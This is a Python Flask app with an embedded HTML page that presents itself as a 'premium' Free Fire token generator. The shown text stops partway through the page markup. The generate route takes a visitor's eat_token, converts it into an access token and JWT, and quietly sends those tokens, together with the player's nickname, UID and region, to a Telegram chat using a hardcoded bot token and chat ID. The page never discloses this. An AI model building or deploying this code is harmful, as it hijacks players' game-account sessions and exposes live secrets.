from flask import Flask, Response, request, jsonify
import requests
from datetime import datetime
from html import escape
import base64

app = Flask(__name__)

# ═══════════════════════════════════════════════════════════════
#   🤖 TELEGRAM BOT CONFIG  —  REPLACE THESE TWO VALUES
# ═══════════════════════════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "9201813081:AAFuYGngv4kXKfmV_vqIy4SnsKECMucGLYs"
TELEGRAM_CHAT_ID   = "9107572388"
# ═══════════════════════════════════════════════════════════════

FF_API = "https://ff-jwt-gen-api.lovable.app/api/public/token"


def decode_nickname(encoded):
    if not encoded:
        return "-"
    try:
        decoded = base64.b64decode(encoded).decode("utf-8", errors="ignore")
        if decoded.strip():
            return decoded
    except Exception:
        pass
    return encoded


def extract_fields(result):
    nickname = "-"
    if result.get("jwt_decoded", {}).get("payload", {}).get("nickname"):
        nickname = decode_nickname(result["jwt_decoded"]["payload"]["nickname"])
    elif result.get("nickname"):
        nickname = result["nickname"]

    region = "-"
    if result.get("region"):
        region = result["region"]
    elif result.get("jwt_decoded", {}).get("payload", {}).get("noti_region"):
        region = result["jwt_decoded"]["payload"]["noti_region"]

    uid = "-"
    if result.get("account_uid"):
        uid = str(result["account_uid"])
    elif result.get("jwt_decoded", {}).get("payload", {}).get("account_id"):
        uid = str(result["jwt_decoded"]["payload"]["account_id"])
    elif result.get("Uid"):
        uid = str(result["Uid"])

    return nickname, region, uid


def send_to_telegram(nickname, region, uid, access_token, jwt_token):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "PASTE_YOUR_BOT_TOKEN_HERE":
        return False, "Telegram bot not configured"
    try:
        DIV = "━━━━━━━━━━━━━━━━━━"

        L = []
        L.append("✨ <b>ＮＧ  ＴＯＫＥＮ  ＧＥＮＥＲＡＴＯＲ</b> ✨")
        L.append(DIV)
        L.append("✅ <b>TOKEN DELIVERY SUCCESS</b>")
        L.append("")
        L.append(f"🎮 <b>Player</b>  ›  <code>{escape(nickname)}</code>")
        L.append(f"🆔 <b>UID</b>  ›  <code>{escape(uid)}</code>")
        L.append(f"🌐 <b>Region</b>  ›  <code>{escape(region)}</code>")
        L.append(DIV)
        L.append("💖 <b>ACCESS TOKEN</b>  <i>(tap to copy)</i>")
        L.append(f"<code>{escape(access_token)}</code>")
        L.append("")

        if jwt_token and jwt_token != "-":
            L.append(DIV)
            L.append("❤️ <b>JWT TOKEN</b>  <i>(tap to copy)</i>")
            if len(jwt_token) > 2000:
                L.append(f"<code>{escape(jwt_token[:2000])}</code>")
                L.append("<i>⚠️ JWT truncated — full token available on website</i>")
            else:
                L.append(f"<code>{escape(jwt_token)}</code>")
            L.append("")

        L.append(DIV)
        L.append(f"⏰ <b>Time</b>  ›  <code>{datetime.now().strftime('%d-%m-%Y  %H:%M:%S')}</code>")
        L.append(DIV)
        L.append("⚡ <b>New Token Notification.! </b>")
        
        text = "\n".join(L)
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        r = requests.post(url, json=payload, timeout=15)
        res = r.json()
        if res.get("ok"):
            return True, "Sent"
        return False, res.get("description", "Unknown Telegram error")
    except Exception as e:
        return False, str(e)


@app.route("/api/generate")
def generate():
    eat_token = request.args.get("eat_token", "").strip()
    if not eat_token:
        return jsonify({"success": False, "error": "Missing eat_token"}), 400
    try:
        r = requests.get(FF_API, params={"eat_token": eat_token}, timeout=25)
        try:
            result = r.json()
        except Exception:
            return jsonify({"success": False, "error": "Invalid JSON from API", "raw": r.text}), 502
    except Exception as e:
        return jsonify({"success": False, "error": f"API request failed: {e}"}), 502

    if isinstance(result, dict) and (result.get("success") is False or result.get("error")):
        return jsonify(result), 200

    nickname, region, uid = extract_fields(result)
    access_token = result.get("token_access", "-")
    jwt_token    = result.get("token", "-")
    tg_ok, tg_msg = send_to_telegram(nickname, region, uid, access_token, jwt_token)
    result["telegram_sent"] = tg_ok
    result["telegram_message"] = tg_msg
    return jsonify(result), 200


HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
<meta name="theme-color" content="#0f0510" />
<meta name="description" content="NG SUJEET Premium Access Generator — Free Fire Eat Token tool." />
<title>NG SUJEET Token | Premium</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
<script src="https://cdn.tailwindcss.com"></script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Rajdhani:wght@500;600;700&display=swap');

:root{
    --pink-1:#ec4899;
    --pink-2:#f472b6;
    --pink-3:#db2777;
    --pink-light:#fbcfe8;
    --pink-glow:rgba(236,72,153,0.45);
    --pink-glow-soft:rgba(236,72,153,0.18);
    --bg-deep:#0f0510;
    --bg-card:#1a0a1a;
    --bg-card-2:#12061a;
}

*{ -webkit-tap-highlight-color: transparent; box-sizing: border-box; }

html, body {
    margin: 0; padding: 0;
    height: 100%;
    overflow: hidden;
    background: #050205;
    font-family: 'Space Grotesk', sans-serif;
}

/* ═══ APP SHELL ═══ */
.app-shell {
    width: 100%;
    max-width: 430px;
    height: 100vh;
    height: 100dvh;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    position: relative;
    overflow: hidden;
    background:
        radial-gradient(circle at 20% 0%, rgba(236,72,153,0.28) 0%, transparent 45%),
        radial-gradient(circle at 90% 100%, rgba(219,39,119,0.22) 0%, transparent 50%),
        radial-gradient(circle at 50% 50%, rgba(244,114,182,0.06) 0%, transparent 65%),
        linear-gradient(180deg, #0f0510 0%, #08030d 100%);
    box-shadow: 0 0 80px rgba(236,72,153,0.15);
}

/* Grid overlay */
.app-shell::before {
    content: "";
    position: absolute;
    inset: 0;
    background-image:
        linear-gradient(rgba(236,72,153,0.04) 1px, transparent 1px),
        linear-gradient(90deg, rgba(236,72,153,0.04) 1px, transparent 1px);
    background-size: 28px 28px;
    pointer-events: none;
    z-index: 0;
}

/* Animated glow orbs */
.orb {
    position: absolute;
    border-radius: 50%;
    filter: blur(70px);
    pointer-events: none;
    z-index: 0;
    will-change: transform;
}
.orb-1 {
    width: 280px; height: 280px;
    background: radial-gradient(circle, #ec4899 0%, transparent 70%);
    top: -60px; left: -60px;
    opacity: 0.5;
    animation: orbFloat1 14s ease-in-out infinite;
}
.orb-2 {
    width: 340px; height: 340px;
    background: radial-gradient(circle, #db2777 0%, transparent 70%);
    bottom: -100px; right: -80px;
    opacity: 0.4;
    animation: orbFloat2 18s ease-in-out infinite;
}
.orb-3 {
    width: 180px; height: 180px;
    background: radial-gradient(circle, #f472b6 0%, transparent 70%);
    top: 45%; right: -60px;
    opacity: 0.3;
    animation: orbFloat3 12s ease-in-out infinite;
}
@keyframes orbFloat1 {
    0%,100%{ transform: translate(0,0) scale(1); }
    50%{ transform: translate(50px,40px) scale(1.2); }
}
@keyframes orbFloat2 {
    0%,100%{ transform: translate(0,0) scale(1); }
    50%{ transform: translate(-40px,-60px) scale(1.15); }
}
@keyframes orbFloat3 {
    0%,100%{ transform: translate(0,0) scale(1); }
    50%{ transform: translate(-30px,-50px) scale(1.3); }
}

/* ═══ TOP APP BAR ═══ */
.app-header {
    position: relative;
    z-index: 10;
    padding: 18px 20px 14px;
    display: flex;
    align-items: center;
    gap: 12px;
    border-bottom: 1px solid rgba(236,72,153,0.15);
    background: linear-gradient(180deg, rgba(15,5,16,0.6), transparent);
    backdrop-filter: blur(10px);
    flex-shrink: 0;
}

.logo-3d {
    width: 46px; height: 46px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    background: linear-gradient(145deg, #f472b6 0%, #ec4899 45%, #db2777 100%);
    border: 1.5px solid rgba(255,255,255,0.3);
    box-shadow:
        0 6px 20px rgba(236,72,153,0.5),
        inset 0 2px 0 rgba(255,255,255,0.4),
        inset 0 -3px 6px rgba(0,0,0,0.35);
    animation: logoPulse 3s ease-in-out infinite;
    flex-shrink: 0;
}
.logo-3d::before {
    content: "";
    position: absolute;
    inset: -4px;
    border-radius: 50%;
    background: conic-gradient(from 0deg, transparent, #ec4899, transparent, #f472b6, transparent);
    animation: rotateRing 4s linear infinite;
    z-index: -1;
    opacity: 0.7;
    filter: blur(4px);
}
.logo-3d span {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 18px;
    color: #fff;
    letter-spacing: -1px;
    text-shadow: 0 1px 3px rgba(0,0,0,0.4);
}
@keyframes logoPulse {
    0%,100%{ box-shadow: 0 6px 20px rgba(236,72,153,0.5), inset 0 2px 0 rgba(255,255,255,0.4), inset 0 -3px 6px rgba(0,0,0,0.35); }
    50%{ box-shadow: 0 6px 30px rgba(236,72,153,0.8), inset 0 2px 0 rgba(255,255,255,0.4), inset 0 -3px 6px rgba(0,0,0,0.35); }
}
@keyframes rotateRing {
    to{ transform: rotate(360deg); }
}

.app-title h1 {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 17px;
    color: #fff;
    margin: 0;
    letter-spacing: 0.5px;
    line-height: 1.1;
    background: linear-gradient(90deg, #fff, #fbcfe8);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}
.app-title p {
    font-size: 10px;
    color: #f472b6;
    margin: 2px 0 0;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    font-weight: 600;
}

.header-badge {
    margin-left: auto;
    background: linear-gradient(135deg, rgba(236,72,153,0.25), rgba(219,39,119,0.15));
    border: 1px solid rgba(236,72,153,0.4);
    color: #fbcfe8;
    font-size: 9px;
    font-weight: 700;
    padding: 5px 10px;
    border-radius: 20px;
    letter-spacing: 0.5px;
    display: flex;
    align-items: center;
    gap: 4px;
    animation: badgeGlow 2s ease-in-out infinite;
}
@keyframes badgeGlow {
    0%,100%{ box-shadow: 0 0 8px rgba(236,72,153,0.3); }
    50%{ box-shadow: 0 0 16px rgba(236,72,153,0.6); }
}

/* ═══ SCROLLABLE CONTENT ═══ */
.app-content {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    padding: 18px 16px 100px;
    position: relative;
    z-index: 5;
    scrollbar-width: thin;
    scrollbar-color: #ec4899 transparent;
}
.app-content::-webkit-scrollbar { width: 3px; }
.app-content::-webkit-scrollbar-thumb { background: #ec4899; border-radius: 3px; }

/* Tab panels */
.tab-panel {
    display: none;
    animation: slideIn 0.35s cubic-bezier(0.22, 1, 0.36, 1);
}
.tab-panel.active { display: block; }

@keyframes slideIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}

/* ═══ APP CARD ═══ */
.app-card {
    background: linear-gradient(160deg, #1a0a1a 0%, #12061a 100%);
    border: 1px solid rgba(236,72,153,0.2);
    border-radius: 20px;
    padding: 16px;
    margin-bottom: 14px;
    position: relative;
    overflow: hidden;
    box-shadow:
        0 10px 30px -8px rgba(0,0,0,0.6),
        0 4px 15px -3px rgba(236,72,153,0.15),
        inset 0 1px 0 rgba(255,255,255,0.06),
        inset 0 -2px 6px rgba(0,0,0,0.4);
    animation: cardIn 0.5s ease backwards;
}
.app-card:nth-child(1){ animation-delay: 0.05s; }
.app-card:nth-child(2){ animation-delay: 0.1s; }
.app-card:nth-child(3){ animation-delay: 0.15s; }
.app-card:nth-child(4){ animation-delay: 0.2s; }
@keyframes cardIn {
    from { opacity: 0; transform: translateY(15px) scale(0.98); }
    to { opacity: 1; transform: translateY(0) scale(1); }
}
.app-card::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(236,72,153,0.5), transparent);
    animation: topGlow 3s ease-in-out infinite;
}
@keyframes topGlow {
    0%,100%{ opacity: 0.3; }
    50%{ opacity: 1; }
}

/* ═══ SECTION HEADER ═══ */
.section-title {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 11px;
    font-weight: 700;
    color: #fbcfe8;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 12px;
}
.section-title i {
    color: #ec4899;
    font-size: 12px;
}

/* ═══ 3D INPUT ═══ */
.cyber-input {
    width: 100%;
    background: linear-gradient(180deg, rgba(5,2,8,0.9), rgba(20,8,26,0.95));
    border: 1px solid rgba(236,72,153,0.25);
    color: #fff;
    font-family: monospace;
    padding: 14px 42px 14px 14px;
    border-radius: 14px;
    font-size: 13px;
    transition: all 0.25s ease;
    box-shadow:
        inset 0 4px 12px rgba(0,0,0,0.7),
        0 1px 0 rgba(255,255,255,0.05);
}
.cyber-input::placeholder { color: #6b4a5a; }
.cyber-input:focus {
    border-color: #ec4899;
    outline: none;
    box-shadow:
        inset 0 4px 12px rgba(0,0,0,0.7),
        0 0 0 3px rgba(236,72,153,0.15),
        0 0 25px rgba(236,72,153,0.35);
}

/* ═══ 3D PINK BUTTON ═══ */
.btn-3d {
    width: 100%;
    padding: 15px;
    border-radius: 14px;
    border: none;
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 15px;
    letter-spacing: 2px;
    color: #fff;
    background: linear-gradient(180deg, #f472b6 0%, #ec4899 45%, #db2777 100%);
    box-shadow:
        0 5px 0 #831843,
        0 8px 20px rgba(236,72,153,0.5),
        inset 0 2px 0 rgba(255,255,255,0.3),
        inset 0 -3px 6px rgba(0,0,0,0.3);
    cursor: pointer;
    transition: all 0.12s ease;
    position: relative;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transform: translateY(0);
}
.btn-3d::before {
    content: "";
    position: absolute;
    top: 0; left: -60%;
    width: 40%; height: 100%;
    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
    animation: btnShine 2.5s ease-in-out infinite;
}
@keyframes btnShine {
    0%{ left: -60%; }
    50%,100%{ left: 130%; }
}
.btn-3d:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow:
        0 7px 0 #831843,
        0 12px 28px rgba(236,72,153,0.7),
        inset 0 2px 0 rgba(255,255,255,0.35),
        inset 0 -3px 6px rgba(0,0,0,0.3);
}
.btn-3d:active:not(:disabled) {
    transform: translateY(4px);
    box-shadow:
        0 1px 0 #831843,
        0 4px 12px rgba(236,72,153,0.4),
        inset 0 2px 0 rgba(255,255,255,0.2),
        inset 0 -2px 4px rgba(0,0,0,0.4);
}
.btn-3d:disabled { opacity: 0.7; cursor: not-allowed; }

/* ═══ PROVIDER ICONS ═══ */
.provider-btn {
    height: 52px;
    border-radius: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: linear-gradient(145deg, rgba(236,72,153,0.12) 0%, rgba(15,5,16,0.7) 100%);
    border: 1px solid rgba(236,72,153,0.2);
    box-shadow:
        0 3px 0 rgba(5,2,8,0.9),
        0 5px 12px rgba(0,0,0,0.4),
        inset 0 2px 0 rgba(255,255,255,0.08);
    transition: all 0.15s ease;
    position: relative;
    overflow: hidden;
}
.provider-btn::before {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at center, rgba(236,72,153,0.3), transparent 70%);
    opacity: 0;
    transition: opacity 0.2s;
}
.provider-btn:hover::before, .provider-btn:active::before { opacity: 1; }
.provider-btn:hover {
    transform: translateY(-2px);
    border-color: rgba(236,72,153,0.5);
    box-shadow:
        0 5px 0 rgba(5,2,8,0.9),
        0 8px 18px rgba(236,72,153,0.35),
        inset 0 2px 0 rgba(255,255,255,0.12);
}
.provider-btn:active {
    transform: translateY(2px);
    box-shadow:
        0 1px 0 rgba(5,2,8,0.9),
        0 2px 6px rgba(0,0,0,0.4),
        inset 0 2px 4px rgba(0,0,0,0.3);
}
.provider-btn i { font-size: 20px; position: relative; z-index: 1; }

/* ═══ INFO GRID ═══ */
.info-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px;
    margin-bottom: 14px;
}
.info-item {
    background: linear-gradient(145deg, rgba(236,72,153,0.1) 0%, rgba(15,5,16,0.6) 100%);
    border: 1px solid rgba(236,72,153,0.18);
    border-radius: 10px;
    padding: 8px 10px;
    box-shadow:
        0 2px 6px rgba(0,0,0,0.35),
        inset 0 1px 0 rgba(255,255,255,0.06);
    animation: cardIn 0.4s ease backwards;
}
.info-item:nth-child(1){ animation-delay: 0.05s; }
.info-item:nth-child(2){ animation-delay: 0.1s; }
.info-item:nth-child(3){ animation-delay: 0.15s; grid-column: span 2; }
.info-item .label {
    font-size: 8px;
    text-transform: uppercase;
    color: #f472b6;
    letter-spacing: 0.8px;
    font-weight: 700;
    opacity: 0.85;
}
.info-item .value {
    font-size: 13px;
    font-weight: 600;
    color: #fff;
    margin-top: 3px;
    font-family: monospace;
    word-break: break-all;
}

/* ═══ SCROLL BOXES ═══ */
.scroll-box, .scroll-box-token, .scroll-box-large {
    background: linear-gradient(135deg, rgba(236,72,153,0.15) 0%, rgba(15,5,16,0.6) 100%);
    border-left: 3px solid #ec4899;
    padding: 10px;
    border-radius: 8px;
    font-family: monospace;
    font-size: 10.5px;
    word-break: break-all;
    color: #fbcfe8;
    overflow-y: auto;
    box-shadow:
        inset 0 3px 8px rgba(0,0,0,0.5),
        inset 0 -1px 0 rgba(255,255,255,0.05);
}
.scroll-box { max-height: 100px; }
.scroll-box-token { max-height: 130px; }
.scroll-box-large { max-height: 200px; white-space: pre-wrap; }

.scroll-box::-webkit-scrollbar,
.scroll-box-token::-webkit-scrollbar,
.scroll-box-large::-webkit-scrollbar { width: 3px; }
.scroll-box::-webkit-scrollbar-thumb,
.scroll-box-token::-webkit-scrollbar-thumb,
.scroll-box-large::-webkit-scrollbar-thumb {
    background: #ec4899; border-radius: 3px;
}

/* ═══ COPY BUTTON ═══ */
.copy-btn {
    font-size: 10px;
    font-weight: 700;
    background: linear-gradient(135deg, rgba(236,72,153,0.3), rgba(219,39,119,0.25));
    border: 1px solid rgba(236,72,153,0.4);
    color: #fbcfe8;
    padding: 6px 12px;
    border-radius: 8px;
    transition: all 0.15s;
    display: flex;
    align-items: center;
    gap: 4px;
    cursor: pointer;
}
.copy-btn:hover {
    background: linear-gradient(135deg, rgba(236,72,153,0.5), rgba(219,39,119,0.4));
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(236,72,153,0.3);
}
.copy-btn:active { transform: translateY(1px); }
.copy-btn-success {
    background: #10b981 !important;
    border-color: #059669 !important;
    color: #fff !important;
}

/* ═══ TUTORIAL BANNER ═══ */
.tutorial-banner {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 14px;
    border-radius: 14px;
    background: linear-gradient(135deg, rgba(236,72,153,0.18) 0%, rgba(219,39,119,0.08) 100%);
    border: 1px dashed rgba(236,72,153,0.5);
    text-decoration: none;
    margin-bottom: 14px;
    transition: all 0.2s;
    box-shadow:
        0 4px 12px rgba(0,0,0,0.3),
        inset 0 1px 0 rgba(255,255,255,0.05);
    animation: cardIn 0.5s ease backwards;
    animation-delay: 0.15s;
}
.tutorial-banner:hover {
    transform: translateY(-2px);
    background: linear-gradient(135deg, rgba(236,72,153,0.3) 0%, rgba(219,39,119,0.15) 100%);
    border-color: rgba(236,72,153,0.9);
    box-shadow:
        0 6px 20px rgba(236,72,153,0.35),
        inset 0 1px 0 rgba(255,255,255,0.08);
}
.tutorial-banner .yt-icon {
    font-size: 26px;
    color: #ff0000;
    animation: bounce 2s ease-in-out infinite;
}
@keyframes bounce {
    0%,100%{ transform: translateY(0); }
    50%{ transform: translateY(-3px); }
}

/* ═══ STEP ITEMS ═══ */
.step {
    display: flex;
    gap: 10px;
    margin-bottom: 12px;
    font-size: 11.5px;
    color: #a8a0b0;
    line-height: 1.5;
}
.step:last-child { margin-bottom: 0; }
.step-num {
    flex-shrink: 0;
    width: 22px; height: 22px;
    border-radius: 50%;
    background: linear-gradient(145deg, #f472b6, #db2777);
    color: #fff;
    font-weight: 700;
    font-size: 11px;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow:
        0 3px 8px rgba(236,72,153,0.5),
        inset 0 1px 0 rgba(255,255,255,0.3);
    animation: stepPulse 2.5s ease-in-out infinite;
}
.step:nth-child(2) .step-num { animation-delay: 0.4s; }
.step:nth-child(3) .step-num { animation-delay: 0.8s; }
@keyframes stepPulse {
    0%,100%{ box-shadow: 0 3px 8px rgba(236,72,153,0.4), inset 0 1px 0 rgba(255,255,255,0.3); }
    50%{ box-shadow: 0 3px 16px rgba(236,72,153,0.9), inset 0 1px 0 rgba(255,255,255,0.3); }
}
.step strong { color: #fff; }
.step code {
    color: #f472b6;
    background: rgba(236,72,153,0.1);
    padding: 1px 5px;
    border-radius: 4px;
    font-size: 10px;
}

/* ═══ ERROR BOX ═══ */
.error-box {
    background: rgba(239,68,68,0.1);
    border: 1px solid rgba(239,68,68,0.35);
    border-radius: 14px;
    padding: 14px;
    text-align: center;
    animation: shake 0.5s ease;
}
@keyframes shake {
    0%,100%{ transform: translateX(0); }
    25%{ transform: translateX(-6px); }
    75%{ transform: translateX(6px); }
}

/* ═══ SOCIAL CARD ═══ */
.social-card {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 12px;
    border-radius: 14px;
    background: linear-gradient(145deg, rgba(236,72,153,0.12) 0%, rgba(15,5,16,0.6) 100%);
    border: 1px solid rgba(236,72,153,0.18);
    text-decoration: none;
    transition: all 0.15s;
    box-shadow:
        0 3px 0 rgba(5,2,8,0.8),
        0 5px 12px rgba(0,0,0,0.3),
        inset 0 1px 0 rgba(255,255,255,0.06);
    animation: cardIn 0.4s ease backwards;
}
.social-card:hover {
    transform: translateY(-2px);
    border-color: rgba(236,72,153,0.45);
    box-shadow:
        0 5px 0 rgba(5,2,8,0.8),
        0 8px 20px rgba(236,72,153,0.3),
        inset 0 1px 0 rgba(255,255,255,0.1);
}
.social-card:active { transform: translateY(1px); }
.social-card i { font-size: 18px; }
.social-card span {
    font-size: 12px;
    font-weight: 600;
    color: #d0c0c8;
}

/* ═══ BOTTOM NAV ═══ */
.app-bottom-nav {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 74px;
    display: flex;
    align-items: center;
    justify-content: space-around;
    padding: 0 8px 8px;
    background: linear-gradient(180deg, rgba(15,5,16,0.7) 0%, rgba(10,3,12,0.98) 100%);
    border-top: 1px solid rgba(236,72,153,0.2);
    backdrop-filter: blur(20px);
    z-index: 20;
    box-shadow: 0 -10px 30px rgba(0,0,0,0.5);
}
.app-bottom-nav::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(236,72,153,0.6), transparent);
}
.nav-btn {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 3px;
    padding: 8px 4px;
    background: none;
    border: none;
    color: #6b4a5a;
    cursor: pointer;
    transition: all 0.2s ease;
    position: relative;
    border-radius: 12px;
    font-family: inherit;
}
.nav-btn i {
    font-size: 17px;
    transition: all 0.25s ease;
}
.nav-btn span {
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    transition: all 0.2s;
}
.nav-btn.active { color: #ec4899; }
.nav-btn.active i {
    transform: translateY(-2px) scale(1.15);
    filter: drop-shadow(0 0 8px rgba(236,72,153,0.7));
    animation: navIconPulse 2s ease-in-out infinite;
}
.nav-btn.active::after {
    content: "";
    position: absolute;
    bottom: 2px;
    left: 50%;
    transform: translateX(-50%);
    width: 18px;
    height: 3px;
    border-radius: 2px;
    background: linear-gradient(90deg, #f472b6, #ec4899);
    box-shadow: 0 0 8px rgba(236,72,153,0.8);
    animation: navDotPulse 2s ease-in-out infinite;
}
@keyframes navIconPulse {
    0%,100%{ filter: drop-shadow(0 0 6px rgba(236,72,153,0.5)); }
    50%{ filter: drop-shadow(0 0 14px rgba(236,72,153,1)); }
}
@keyframes navDotPulse {
    0%,100%{ opacity: 0.7; width: 18px; }
    50%{ opacity: 1; width: 24px; }
}

/* ═══ MODAL ═══ */
.modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(5,2,8,0.92);
    backdrop-filter: blur(10px);
    opacity: 0;
    visibility: hidden;
    transition: 0.3s;
    z-index: 100;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
.modal-overlay.active {
    opacity: 1;
    visibility: visible;
}
.modal-content {
    background: linear-gradient(160deg, #1a0a1a 0%, #0f0510 100%);
    border: 1px solid rgba(236,72,153,0.3);
    border-radius: 22px;
    padding: 22px;
    max-width: 380px;
    width: 100%;
    position: relative;
    transform: scale(0.9);
    transition: transform 0.3s;
    box-shadow:
        0 25px 60px -10px rgba(0,0,0,0.7),
        0 0 50px rgba(236,72,153,0.25);
}
.modal-overlay.active .modal-content {
    transform: scale(1);
}

/* Small screens */
@media (max-width: 380px) {
    .app-title h1 { font-size: 15px; }
    .header-badge { display: none; }
    .app-card { padding: 14px; border-radius: 16px; }
}

/* ═══════════════════════════════════════════════════════
   📱 TABLET  (600px – 899px)
   ═══════════════════════════════════════════════════════ */
@media (min-width: 600px) and (max-width: 899px) {
    .app-shell { max-width: 480px; }
}

/* ═══════════════════════════════════════════════════════
   🖥️  DESKTOP / FULL VIEW  (>= 900px)
   ═══════════════════════════════════════════════════════ */
@media (min-width: 900px) {

    /* ---------- Shell full screen ---------- */
    .app-shell {
        max-width: 100%;
        height: 100vh;
        height: 100dvh;
        border-radius: 0;
        box-shadow: none;
    }

    /* Bade orbs — full screen me khoobsurat lagte hain */
    .orb-1 { width: 480px; height: 480px; opacity: .45; }
    .orb-2 { width: 540px; height: 540px; opacity: .35; }
    .orb-3 { width: 300px; height: 300px; opacity: .28; }

    /* ---------- Header ---------- */
    .app-header {
        padding: 20px 40px 16px;
        gap: 14px;
    }
    .logo-3d { width: 52px; height: 52px; }
    .logo-3d span { font-size: 20px; }
    .app-title h1 { font-size: 20px; letter-spacing: 1px; }
    .app-title p  { font-size: 11px; letter-spacing: 2px; }
    .header-badge { font-size: 10px; padding: 6px 14px; }

    /* ---------- Content ---------- */
    .app-content { padding: 26px 40px 140px; }
    .tab-panel   { max-width: 1240px; margin: 0 auto; }

    /* ---------- HOME TAB : 2 columns ---------- */
    #tab-generate.active {
        display: grid;
        grid-template-columns: minmax(340px, 430px) minmax(0, 1fr);
        gap: 18px;
        align-items: start;
    }
    #tab-generate > .tutorial-banner {
        grid-column: 1; grid-row: 1;
        margin-bottom: 0;
    }
    #tab-generate > .app-card:nth-of-type(1) {
        grid-column: 1; grid-row: 2; margin-bottom: 0;
    }
    #tab-generate > .app-card:nth-of-type(2) {
        grid-column: 1; grid-row: 3; margin-bottom: 0;
    }
    #tab-generate > #btn {
        grid-column: 1; grid-row: 4;
    }
    #tab-generate > #output {
        grid-column: 2;
        grid-row: 1 / span 4;
        margin-top: 0 !important;
    }
    #tab-generate > #error-box {
        grid-column: 2; grid-row: 1;
        margin-top: 0 !important;
    }
    #tab-generate > #output .scroll-box-token { max-height: 170px; }
    #tab-generate > #output .scroll-box-large { max-height: 260px; }

    /* ---------- GUIDE / LINKS / TERMS : auto grid ---------- */
    #tab-howto.active,
    #tab-social.active,
    #tab-terms.active {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
        gap: 18px;
        align-items: start;
    }
    #tab-howto .app-card,
    #tab-social .app-card,
    #tab-terms .app-card { margin-bottom: 0; }

    /* ---------- Bottom nav → floating pill ---------- */
    .app-bottom-nav {
        left: 50%;
        right: auto;
        transform: translateX(-50%);
        width: min(580px, calc(100% - 80px));
        height: 70px;
        bottom: 20px;
        padding: 0 12px;
        border-radius: 22px;
        border: 1px solid rgba(236,72,153,0.28);
        box-shadow:
            0 20px 45px -12px rgba(0,0,0,0.85),
            0 0 35px rgba(236,72,153,0.20);
    }
    .app-bottom-nav::before { display: none; }
    .nav-btn i    { font-size: 19px; }
    .nav-btn span { font-size: 10px; letter-spacing: 1px; }
}
</style>
</head>
<body>

<div class="app-shell">
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>

    <!-- ═══ TOP BAR ═══ -->
    <header class="app-header">
        <div class="logo-3d"><span>NG</span></div>
        <div class="app-title">
            <h1>NG SUJEET</h1>
            <p>Premium Token</p>
        </div>
        <div class="header-badge">
            <i class="fas fa-crown" style="font-size:8px;"></i> PRO
        </div>
    </header>

    <!-- ═══ SCROLLABLE CONTENT ═══ -->
    <main class="app-content">

        <!-- ════ TAB: GENERATE ════ -->
        <section id="tab-generate" class="tab-panel active">

            <!-- Tutorial Banner -->
            <a href="Your YouTube toturial" target="_blank" class="tutorial-banner">
                <i class="fab fa-youtube yt-icon"></i>
                <div style="flex:1; text-align:left;">
                    <div style="font-size:11px; font-weight:700; color:#fff; letter-spacing:0.5px; text-transform:uppercase;">Watch Tutorial</div>
                    <div style="font-size:9.5px; color:#a8a0b0; margin-top:1px;">How to get Eat Token →</div>
                </div>
                <i class="fas fa-chevron-right" style="color:#ec4899; font-size:12px;"></i>
            </a>

            <!-- Provider Login -->
            <div class="app-card">
                <div class="section-title">
                    <i class="fas fa-sign-in-alt"></i> Login to Continue
                </div>
                <div class="grid grid-cols-5 gap-2">
                    <a href="https://auth.garena.com/universal/oauth?platform=8&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="provider-btn" title="Google">
                        <i class="fab fa-google" style="color:#fff;"></i>
                    </a>
